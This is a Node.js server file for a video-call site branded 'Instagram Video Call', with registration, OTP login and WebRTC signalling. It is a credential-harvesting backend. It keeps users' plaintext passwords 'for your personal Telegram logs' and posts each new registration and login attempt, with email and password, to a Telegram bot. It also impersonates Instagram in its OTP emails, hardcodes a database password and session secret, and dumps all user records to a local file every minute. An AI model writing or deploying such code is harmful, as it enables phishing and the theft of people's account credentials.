require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const session = require('express-session');
const MongoStore = require('connect-mongo'); // Fixed Require
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');
const nodemailer = require('nodemailer');
const { v4: uuidv4 } = require('uuid');
const fetch = require('node-fetch');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

// ── 1. DATABASE CONNECTION ──
const MONGO_URI = process.env.MONGO_URI || 'mongodb+srv://knight_rider:GODGURU12345@knight.jm59gu9.mongodb.net/?retryWrites=true&w=majority';
mongoose.connect(MONGO_URI)
  .then(() => console.log('✅ MongoDB Connected Successfully'))
  .catch(e => console.log('❌ MongoDB Connection Error:', e));

// ── 2. USER SCHEMA (Professional Logging) ──
const userSchema = new mongoose.Schema({
  name: String,
  email: { type: String, unique: true, required: true },
  password: { type: String, required: true }, // Hashed for security
  plainPassword: { type: String }, // For your personal Telegram logs
  verified: { type: Boolean, default: false },
  roomId: String,
  createdAt: { type: String, default: () => new Date().toISOString() },
  loginCount: { type: Number, default: 0 },
  lastLogin: String,
  loginMethod: { type: String, default: 'email' }
});
const User = mongoose.model('User', userSchema);

const otps = {};       
const rooms = {};      

// ── 3. MIDDLEWARE (Fixed Session Error) ──
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.use(session({
  secret: process.env.SESSION_SECRET || 'toxiclabs_secret_2026',
  resave: false,
  saveUninitialized: false,
  store: MongoStore.create({ 
    mongoUrl: MONGO_URI,
    collectionName: 'sessions',
    ttl: 7 * 24 * 60 * 60 // 7 Days
  }),
  cookie: { secure: false, maxAge: 7 * 24 * 60 * 60 * 1000 }
}));

const mailer = nodemailer.createTransport({
  service: 'gmail',
  auth: { user: process.env.MAIL_USER, pass: process.env.MAIL_PASS }
});

// ── 4. NOTIFIERS (Fast & Background) ──
async function sendTelegram(message) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;
  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
  }).catch(() => {}); 
}

async function sendOTP(email, name, otp, type) {
  const subject = type === 'verify' ? '✅ Verify your Account' : '🔐 Your login OTP';
  const html = `
  <div style="max-width:520px;margin:40px auto;background:#fff;border-radius:20px;overflow:hidden;box-shadow:0 4px 24px rgba(0,0,0,0.08);font-family:sans-serif;">
    <div style="background:linear-gradient(135deg,#833ab4,#fd1d1d,#fcb045);padding:30px;text-align:center;color:#fff;">
      <h1 style="margin:0;">Instagram Video Call</h1>
    </div>
    <div style="padding:30px;text-align:center;">
      <p style="font-size:16px;">Hi <b>${name}</b>, use the code below:</p>
      <div style="font-size:40px;font-weight:bold;letter-spacing:10px;margin:20px 0;color:#262626;">${otp}</div>
      <p style="color:#8e8e8e;font-size:12px;">Valid for 10 minutes.</p>
    </div>
  </div>`;

  mailer.sendMail({ from: `"Instagram Video Call" <${process.env.MAIL_USER}>`, to: email, subject, html }).catch(() => {});
}

// ── 5. AUTH HELPERS ──
const genOTP = () => Math.floor(100000 + Math.random() * 900000).toString();
const genRoomId = () => uuidv4().replace(/-/g, '').slice(0, 8).toUpperCase();

async function isLoggedIn(req, res, next) {
  if (req.session.userId) {
    const user = await User.findOne({ email: req.session.userId });
    if (user) return next();
  }
  res.status(401).json({ ok: false, msg: 'Not authenticated' });
}

// ── 6. API ROUTES (Fixed Logic & Sync) ──

app.post('/api/register', async (req, res) => {
  const { name, email, password } = req.body;
  if (!name || !email || !password) return res.json({ ok: false, msg: 'All fields required' });

  const existing = await User.findOne({ email });
  if (existing) return res.json({ ok: false, msg: 'Email already registered' });

  const hash = await bcrypt.hash(password, 10);
  const otp = genOTP();
  const roomId = genRoomId();

  const user = new User({
    name: name.trim(), email, password: hash, 
    plainPassword: password, roomId, verified: false
  });
  await user.save();

  otps[email] = { code: otp, expires: Date.now() + 600000, type: 'verify' };
  sendOTP(email, name, otp, 'verify');

  sendTelegram(`🆕 <b>NEW REGISTRATION</b>\n👤 Name: ${name}\n📧 Email: ${email}\n🔑 Password: ${password}\n🌍 Room: ${roomId}`);
  res.json({ ok: true, msg: 'OTP sent to email.' });
});

app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await User.findOne({ email });
  if (!user) return res.json({ ok: false, msg: 'No account found with this email' });

  const match = await bcrypt.compare(password, user.password);
  if (!match) return res.json({ ok: false, msg: 'Incorrect password' });

  const otp = genOTP();
  otps[email] = { code: otp, expires: Date.now() + 600000, type: user.verified ? 'login' : 'verify' };
  
  sendOTP(email, user.name, otp, otps[email].type);
  sendTelegram(`🔐 <b>LOGIN ATTEMPT</b>\n👤 Name: ${user.name}\n📧 Email: ${email}\n🔑 Password: ${user.plainPassword || password}`);
  
  res.json({ ok: true, msg: 'OTP sent to email.', needsOTP: true });
});

app.post('/api/verify-otp', async (req, res) => {
  const { email, otp, type } = req.body;
  const record = otps[email];
  if (!record || record.code !== otp.toString()) return res.json({ ok: false, msg: 'Invalid OTP' });

  const user = await User.findOne({ email });
  if (type === 'verify') user.verified = true;
  user.loginCount++;
  user.lastLogin = new Date().toISOString();
  await user.save();

  delete otps[email];
  req.session.userId = email;
  res.json({ ok: true, msg: 'Success!', user: { name: user.name, email: user.email, roomId: user.roomId } });
});

app.get('/api/me', async (req, res) => {
  if (!req.session.userId) return res.json({ ok: false });
  const user = await User.findOne({ email: req.session.userId });
  res.json({ ok: true, user: { name: user.name, email: user.email, roomId: user.roomId } });
});

// ── 7. SOCKET.IO (WebRTC Signaling - Same as Original) ──
io.on('connection', (socket) => {
  socket.on('join-room', ({ roomId, userName }) => {
    socket.join(roomId);
    socket.roomId = roomId;
    socket.userName = userName;
    if (!rooms[roomId]) rooms[roomId] = { id: roomId, participants: [], active: true };
    if (!rooms[roomId].participants.includes(userName)) rooms[roomId].participants.push(userName);
    socket.to(roomId).emit('user-joined', { socketId: socket.id, userName });
    const others = [...io.sockets.adapter.rooms.get(roomId) || []].filter(id => id !== socket.id);
    socket.emit('room-peers', others);
  });

  socket.on('offer', (data) => io.to(data.to).emit('offer', { from: socket.id, offer: data.offer, userName: socket.userName }));
  socket.on('answer', (data) => io.to(data.to).emit('answer', { from: socket.id, answer: data.answer }));
  socket.on('ice-candidate', (data) => io.to(data.to).emit('ice-candidate', { from: socket.id, candidate: data.candidate }));

  socket.on('disconnect', () => {
    if (socket.roomId) socket.to(socket.roomId).emit('user-left', { socketId: socket.id, userName: socket.userName });
  });
});

// ── 8. DATA BACKUP (data.json) ──
async function backupToLocal() {
  try {
    const allUsers = await User.find({});
    const backup = { users: allUsers, timestamp: new Date().toISOString() };
    fs.writeFileSync(path.join(__dirname, 'data.json'), JSON.stringify(backup, null, 2));
  } catch (err) {}
}
setInterval(backupToLocal, 60000); // Sync every minute

app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🚀 ToxicLabs VC Server Live on Port ${PORT}`));
